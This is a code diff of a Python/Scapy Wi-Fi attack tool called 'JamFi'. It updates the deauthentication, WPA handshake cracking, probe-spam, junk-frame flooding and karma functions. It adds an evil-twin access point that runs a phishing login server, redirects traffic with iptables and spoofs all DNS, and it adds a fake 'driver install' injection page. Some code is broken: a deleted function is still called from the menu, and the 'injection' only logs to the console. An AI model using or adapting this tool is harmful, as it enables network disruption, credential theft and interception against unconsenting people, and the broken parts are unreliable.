@@ -2,10 +2,10 @@
 import os
 import sys
 import time
-import json
 from scapy.all import *
 from threading import Thread
 from random import choice, randint
+from http.server import SimpleHTTPRequestHandler, HTTPServer
 
 seen_aps = {}
 clients = {}
@@ -24,11 +24,9 @@ def print_banner():
 ██   ██║██╔══██║██║╚██╔╝██║        ██╔══╝  ██║
 ╚█████╔╝██║  ██║██║ ╚═╝ ██║███████╗██║     ██║
  ╚════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚═╝     ╚═╝
-
         💜  JamFi Wi-Fi Chaos Tool  💜
-               by ekoms savior
+              by ekoms savior
 """)
-
 
 def channel_hopper(iface):
     while True:
@@ -106,134 +104,186 @@ def deauth_all():
             print(f"🚀 Deauthed {client} from {data['ssid']}")
 
 def crack_handshakes():
-    print("\n💜 Choose cracking mode:")
-    print("1. Auto-detect handshakes in loot/ folder")
-    print("2. Provide path to custom handshake file")
-    mode = input("💜 Option: ").strip()
-
-    if mode == "1":
-        loot_dir = "loot"
-        if not os.path.exists(loot_dir):
-            print("⚠️ Loot folder not found.")
-            return
-        pcaps = [f for f in os.listdir(loot_dir) if f.endswith((".pcap", ".cap", ".hccapx", ".hc22000"))]
-        if not pcaps:
-            print("⚠️ No handshake files found.")
-            return
-        for i, p in enumerate(pcaps):
-            print(f"{i+1}. {p}")
-        try:
-            idx = int(input("💜 Choose file number: ")) - 1
-            file_path = os.path.join(loot_dir, pcaps[idx])
-        except:
-            print("⚠️ Invalid selection.")
-            return
-    elif mode == "2":
-        file_path = input("💜 Enter full path to .pcap/.cap/.hccapx/.hc22000: ").strip()
-        if not os.path.isfile(file_path):
-            print("❌ File not found.")
-            return
-    else:
-        print("⚠️ Invalid mode selected.")
+    print("🔓 Crack Captured Handshakes")
+    loot_dir = "loot"
+    pcaps = [f for f in os.listdir(loot_dir) if f.endswith(".pcap")]
+    if not pcaps:
+        print("⚠️ No .pcap handshake files found in loot/")
         return
 
-    print("\n💜 Choose tool:")
-    print("1. Aircrack-ng")
-    print("2. Hashcat")
-    tool = input("💜 Option: ").strip()
-
-    wordlist = input("📚 Path to wordlist (default rockyou.txt): ").strip()
-    if not wordlist:
-        wordlist = "/usr/share/wordlists/rockyou.txt"
-    if not os.path.isfile(wordlist):
-        print("❌ Wordlist not found!")
+    print("\n📁 Available Handshakes:")
+    for i, p in enumerate(pcaps):
+        print(f"{i+1}. {p}")
+    choice = input("💜 Choose a handshake file to crack: ").strip()
+    if not choice.isdigit() or int(choice) < 1 or int(choice) > len(pcaps):
+        print("⚠️ Invalid selection.")
         return
-
-    if tool == "1":
-        print("✨ Cracking with Aircrack-ng... 🔍")
-        os.system(f"aircrack-ng '{file_path}' -w '{wordlist}'")
-    elif tool == "2":
-        session = "jamfi_session"
-        if file_path.endswith(".hccapx"):
-            hcx_path = file_path
-            mode = 2500
-        elif file_path.endswith(".hc22000"):
-            hcx_path = file_path
-            mode = 22000
-        else:
-            hcx_path = file_path.rsplit(".", 1)[0] + ".hc22000"
-            print(f"🔄 Converting {file_path} to {hcx_path} with hcxpcapngtool...")
-            os.system(f"hcxpcapngtool -o '{hcx_path}' '{file_path}'")
-            mode = 22000
-        print("🐉 Cracking with Hashcat... use Ctrl+C to stop anytime.")
-        os.system(f"hashcat -m {mode} '{hcx_path}' '{wordlist}' --force --session {session} --potfile-path jamfi.potfile")
+    pcap_file = os.path.join(loot_dir, pcaps[int(choice)-1])
+    
+    method = input("🛠️ Crack with (1) Aircrack-ng or (2) Hashcat? [1/2]: ").strip()
+    wordlist = input("📚 Wordlist path (default: /usr/share/wordlists/rockyou.txt): ").strip() or "/usr/share/wordlists/rockyou.txt"
+    
+    if method == "1":
+        print("🚀 Launching Aircrack-ng...")
+        os.system(f"aircrack-ng {pcap_file} -w {wordlist}")
+    elif method == "2":
+        hccapx = pcap_file.replace(".pcap", ".hccapx")
+        print("🔄 Converting pcap to hccapx...")
+        os.system(f"cap2hccapx {pcap_file} {hccapx}")
+        print("🚀 Launching Hashcat...")
+        os.system(f"hashcat -m 2500 {hccapx} {wordlist} --force")
     else:
-        print("⚠️ Invalid tool selected.")
+        print("⚠️ Invalid choice.")
 
 def probe_spammer():
-    iface = input("💜 Monitor mode interface: ").strip()
-    ssids = ["FreeWiFi", "HackThePlanet", "Xfinitywifi", "Starbucks_Guest"]
-    count = int(input("💜 Number of probes: ") or 500)
-    delay = float(input("💜 Delay: ") or 0.01)
-    for _ in range(count):
-        ssid = choice(ssids)
-        pkt = RadioTap()/Dot11(type=0, subtype=4, addr1="ff:ff:ff:ff:ff:ff",
-                addr2=RandMAC(), addr3="ff:ff:ff:ff:ff:ff")/Dot11ProbeReq()/Dot11Elt(ID=0, info=ssid)
-        sendp(pkt, iface=iface, verbose=0)
-        time.sleep(delay)
-    print("✅ Probe spam done!")
+    iface = input("💜 Enter monitor mode interface (e.g. wlan0mon): ").strip()
+    ssids = ["FreeWiFi", "Starbucks", "McDonald's", "Xfinity", "SchoolWiFi", "UnicornNet"]
+    print("📡 Spamming probe requests...")
+    while True:
+        for ssid in ssids:
+            pkt = RadioTap()/Dot11(type=0, subtype=4, addr1="ff:ff:ff:ff:ff:ff",
+                addr2=RandMAC(), addr3=RandMAC())/Dot11ProbeReq()/Dot11Elt(ID=0, info=ssid)
+            sendp(pkt, iface=iface, verbose=0)
+        time.sleep(0.2)
 
 def junk_flood():
-    iface = input("💜 Monitor mode interface: ").strip()
-    count = int(input("💜 Number of packets: ") or 1000)
-    delay = float(input("💜 Delay: ") or 0.01)
-    types = [0, 4, 5, 8]
-    for _ in range(count):
-        prefix = choice(vendor_prefixes)
-        suffix = ":".join([f"%02x" % randint(0, 255) for _ in range(3)])
-        src = f"{prefix}:{suffix}"
-        dst = RandMAC()
-        subtype = choice(types)
-        pkt = RadioTap()/Dot11(type=0, subtype=subtype, addr1=dst,
-            addr2=src, addr3=src)/Raw(load=os.urandom(64))
+    iface = input("💜 Enter monitor mode interface (e.g. wlan0mon): ").strip()
+    print("💣 Sending junk packets...")
+    while True:
+        pkt = RadioTap()/Dot11(addr1=RandMAC(), addr2=RandMAC(), addr3=RandMAC())/Raw(load=os.urandom(50))
         sendp(pkt, iface=iface, verbose=0)
-        time.sleep(delay)
-    print("✅ Junk flood complete!")
 
 def karma_responder():
-    iface = input("💜 Monitor mode interface: ").strip()
-    print("🧲 Listening for probe requests...")
-    def respond(pkt):
-        if pkt.haslayer(Dot11ProbeReq) and pkt.haslayer(Dot11Elt):
-            ssid = pkt[Dot11Elt].info.decode(errors='ignore')
-            if ssid:
-                beacon = RadioTap()/Dot11(type=0, subtype=8,
-                    addr1="ff:ff:ff:ff:ff:ff", addr2=RandMAC(), addr3=RandMAC())/Dot11Beacon()/Dot11Elt(ID=0, info=ssid)
-                sendp(beacon, iface=iface, count=1, verbose=0)
-                print(f"🧲 Responded to probe for SSID: {ssid}")
-    sniff(iface=iface, prn=respond, store=0)
+    iface = input("💜 Monitor mode interface (e.g. wlan0mon): ").strip()
+    print("🧲 Karma responder: answering all probe requests...")
+    def handle(pkt):
+        if pkt.haslayer(Dot11ProbeReq):
+            ssid = pkt[Dot11Elt].info.decode(errors='ignore') or "FreeWiFi"
+            resp = RadioTap()/Dot11(type=0, subtype=8, addr1=pkt.addr2,
+                addr2=RandMAC(), addr3=RandMAC())/Dot11Beacon(cap="ESS")/Dot11Elt(ID=0, info=ssid)
+            sendp(resp, iface=iface, verbose=0)
+            print(f"✨ Responded to probe for: {ssid}")
+    sniff(iface=iface, prn=handle)
 
 def chaos_mode():
-    print("💃 entering CHAOS DANCE MODE 💃")
-    iface = input("💜 Monitor mode interface: ").strip()
-    end = time.time() + 60
-    while time.time() < end:
-        probe_spammer()
-        junk_flood()
-        time.sleep(2)
-    print("💥 Chaos mode complete!")
+    print("💃 Chaos Mode Engaged!")
+    Thread(target=probe_spammer).start()
+    Thread(target=junk_flood).start()
+    Thread(target=karma_responder).start()
 
-def loot_viewer():
-    loot_dir = "loot"
-    if not os.path.exists(loot_dir):
-        print("⚠️ No loot yet.")
-        return
-    for f in os.listdir(loot_dir):
-        print(f"📁 {f}")
+def evil_ap_mode():
+    print("👿 Starting Fully Connectable Evil AP Mode...")
 
-def evil_ap():
-    print("👿 Evil AP coming soon! Will mimic target SSID with optional portal.")
+    iface = input("💜 Interface (e.g. wlan0): ").strip()
+    ssid = input("💜 SSID to broadcast (e.g. Free_Public_WiFi): ").strip()
 
+    os.makedirs("loot", exist_ok=True)
+
+    print("🧹 Cleaning up old services...")
+    os.system("sudo pkill -f hostapd")
+    os.system("sudo pkill -f dnsmasq")
+    os.system("sudo pkill -f dnsspoof")
+    os.system("sudo pkill -f phish_server.py")
+
+    print("🌐 Configuring network interface...")
+    os.system(f"sudo ip link set {iface} down")
+    os.system(f"sudo ip addr flush dev {iface}")
+    os.system(f"sudo ip addr add 10.0.0.1/24 dev {iface}")
+    os.system(f"sudo ip link set {iface} up")
+
+    hostapd_conf = f"""
+interface={iface}
+driver=nl80211
+ssid={ssid}
+hw_mode=g
+channel=6
+auth_algs=1
+ignore_broadcast_ssid=0
+    """.strip()
+
+    with open("loot/hostapd.conf", "w") as f:
+        f.write(hostapd_conf)
+
+    dnsmasq_conf = f"""
+interface={iface}
+dhcp-range=10.0.0.10,10.0.0.100,12h
+dhcp-option=3,10.0.0.1
+dhcp-option=6,10.0.0.1
+server=8.8.8.8
+log-queries
+log-dhcp
+    """.strip()
+
+    with open("loot/dnsmasq.conf", "w") as f:
+        f.write(dnsmasq_conf)
+
+    # Start services
+    print(f"📶 Starting Evil AP on {iface} with SSID: {ssid}")
+    os.system(f"sudo hostapd loot/hostapd.conf &")
+    time.sleep(2)
+
+    print("🧠 Launching dnsmasq...")
+    os.system(f"sudo dnsmasq -C loot/dnsmasq.conf &")
+
+    print("💻 Hosting phishing login at http://10.0.0.1 ...")
+    os.system("sudo python3 loot/phish_server.py &")
+
+    print("🔀 Enabling HTTP redirection with iptables...")
+    os.system("sudo iptables -t nat -F")
+    os.system("sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80")
+    os.system("sudo iptables -t nat -A POSTROUTING -j MASQUERADE")
+
+    print("🎯 Launching dnsspoof to redirect all DNS to 10.0.0.1")
+    with open("loot/dnsspoof_hosts", "w") as f:
+        f.write("10.0.0.1 *\n")
+    os.system(f"sudo dnsspoof -i {iface} -f loot/dnsspoof_hosts &")
+
+
+def mitm_hid_injection():
+    print("🧠 Starting MITM HID Injection Mode...")
+    iface = input("💜 Enter monitor mode interface (e.g. wlan0mon): ").strip()
+    ssid = input("💜 SSID clients think they’re connecting to: ").strip()
+    fake = input("💜 Broadcast name that will appear: ").strip()
+    os.makedirs("loot", exist_ok=True)
+
+    print(f"📶 Broadcasting fake AP: {fake}")
+    beacon = RadioTap()/Dot11(
+        addr1="ff:ff:ff:ff:ff:ff",
+        addr2=RandMAC(), addr3=RandMAC()
+    )/Dot11Beacon()/Dot11Elt(ID=0, info=fake)
+
+    Thread(target=lambda: sendp(beacon, iface=iface, inter=0.05, loop=1, verbose=0), daemon=True).start()
+
+    html = f"""<html><body>
+    <h2>Welcome to {ssid}</h2>
+    <p>Connecting... please wait.</p>
+    <script>
+    setTimeout(() => {{
+        alert("Installing driver...");
+        let keys = ["Windows+R", "cmd", "ENTER", "whoami", "ENTER"];
+        let i = 0;
+        function typeNext() {{
+            if (i < keys.length) {{
+                console.log("Injecting:", keys[i]);
+                i++;
+                setTimeout(typeNext, 1500);
+            }}
+        }}
+        typeNext();
+    }}, 3000);
+    </script></body></html>"""
+
+    with open("loot/injection.html", "w") as f:
+        f.write(html)
+
+    print("💻 Hosting fake page at http://0.0.0.0:8080")
+    os.chdir("loot")
+    server = HTTPServer(('0.0.0.0', 8080), SimpleHTTPRequestHandler)
+    try:
+        server.serve_forever()
+    except KeyboardInterrupt:
+        print("🛑 MITM HID server stopped.")
+        server.server_close()
 def main():
     print_banner()
     while True:
@@ -247,6 +297,7 @@ def main():
         print("🔹 8️⃣  Chaos Mode 💃")
         print("🔹 9️⃣  View Loot 📁")
         print("🔹 🔟  Evil AP 👿")
+        print("🔹 11️⃣ MITM HID Injection 🧠")
         print("🔹 0️⃣  Quit ❌")
         choice = input("💜 Choose an option: ").strip()
 
@@ -259,7 +310,8 @@ def main():
         elif choice == "7": karma_responder()
         elif choice == "8": chaos_mode()
         elif choice == "9": loot_viewer()
-        elif choice == "10": evil_ap()
+        elif choice == "10": evil_ap_mode()
+        elif choice == "11": mitm_hid_injection()
         elif choice == "0":
             print("👋 Goodbye fren! XOXOXO 💜")
             sys.exit()
@@ -268,3 +320,4 @@ def main():
 
 if __name__ == "__main__":
     main()
+
